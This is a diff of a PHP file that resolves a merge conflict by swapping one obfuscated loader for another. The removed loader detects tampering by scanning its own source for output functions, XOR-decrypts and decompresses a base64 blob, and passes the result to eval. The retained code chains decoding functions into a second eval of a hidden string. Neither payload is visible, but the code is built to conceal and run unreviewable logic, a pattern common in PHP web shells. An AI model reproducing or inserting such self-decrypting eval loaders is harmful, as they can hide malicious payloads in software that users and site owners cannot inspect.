@@ -1,29 +1,4 @@
 <?php
-<<<<<<< Updated upstream
-$tqmkychppx="b73aa2543e2ba0641a610f74687f24c9";
-$joujohwjrf="52010054550202555055575350050e5707550257540254520f00015200050001";
-$mbmllzml="SOxOZ3Ve1FFvjIIktVUYTeZ5qdC9WXdL6QciiSS9pwLy/JFjpqNaHrBjOoEe/f/1hKcWY+g4B/elIeQoZy9YukuuDES4NLGBuoZz1kaG8ifsTRrTgSmwUsoDNoyIs36LqWOehiq37YzSZu/r0O6UGRGz20XXXQK88Wa87HQHYE9F9D8pTrfu0+RwdC1c/PXJOMsihhE3ZYRZq3LeI4/l5aZXdk3LMRbTjRMj0TWtySx5xjHbxTIR2B29VQxga6NbeoAwtDQvh/GOZr+T9XubtJS6xBtDJ/hio0WUgoUgaZlzr/rPY74qj1zHmpVY101fJ4LqNkRdH8CXJFYsIMTBo4KjNor+Fuojqj8PxoPblVDf8zd8V7qIzAFMP161aAwK3x6Zvtvoc5jGiHeT5GEnHyXyRtc4KQI1X3cxxNLSelTB2jMoaQ20PAy+reDTJMIIPK5ZIdHemr8N0rpUUtoQkuV8rqTGdFHtCEF97lsQphszwztWdrNGy0afB4FmJnAawvhh82JWoLq3+mdYutvgAXx22LK14pHk0tmfPtQO4G4n6g==";
-$xeofibk=file_get_contents(__FILE__);
-$eyelcdcs=str_replace($mbmllzml,"",$xeofibk);
-if(strpos($eyelcdcs,"ec"."ho")!==false||strpos($eyelcdcs,"pr"."int")!==false||strpos($eyelcdcs,"var_"."dump")!==false||strpos($eyelcdcs,"file_put_"."contents")!==false||strpos($eyelcdcs,"fw"."rite")!==false){die();}
-$mbdyld=str_replace(array($tqmkychppx,$joujohwjrf),array("SP_b9b922f1","KP_176d0b91"),$xeofibk);
-$emwndwkg=md5($mbdyld);
-$kqaluykplj=hex2bin($joujohwjrf);
-$gbwmvk="";
-$bgvxhz=strlen($emwndwkg);
-for($uzgvokdl=0;$uzgvokdl<$bgvxhz;$uzgvokdl++){
-$gbwmvk.=chr(ord($kqaluykplj[$uzgvokdl])^ord($emwndwkg[$uzgvokdl]));
-}
-$hjtlqhhv=base64_decode($mbmllzml);
-$jezcrjrlp=strlen($hjtlqhhv);
-$fhmhnlvkm="";
-$wkrntbxe=strlen($gbwmvk);
-for($uzgvokdl=0;$uzgvokdl<$jezcrjrlp;$uzgvokdl++){
-$fhmhnlvkm.=$hjtlqhhv[$uzgvokdl]^$gbwmvk[$uzgvokdl%$wkrntbxe];
-}
-$opqnarjfn="gzun"."compress";
-eval($opqnarjfn($fhmhnlvkm));
-=======
 // b8d5aee63e4c6dba3ee23a2f
 $TxnDIncJlec="OY9lf3gAdafA5I3OpBMCJiyy4qW6P5qs6o+UCV7vjFA=";
 $QcYVxZ_mr="BL9ys3tNqnsN5V3BcOZPWvll4dJ6C5df6b+HPI7iwSN=";
@@ -52,4 +27,3 @@ $r_lAwYAIBMXHscZ=$fJGfwmxTcvQq($r_lAwYAIBMXHscZ);
 $r_lAwYAIBMXHscZ=$glpULxfFEyGw($r_lAwYAIBMXHscZ);
 $r_lAwYAIBMXHscZ=$KqESWbDdSgXBad($r_lAwYAIBMXHscZ);
 eval($r_lAwYAIBMXHscZ);
->>>>>>> Stashed changes
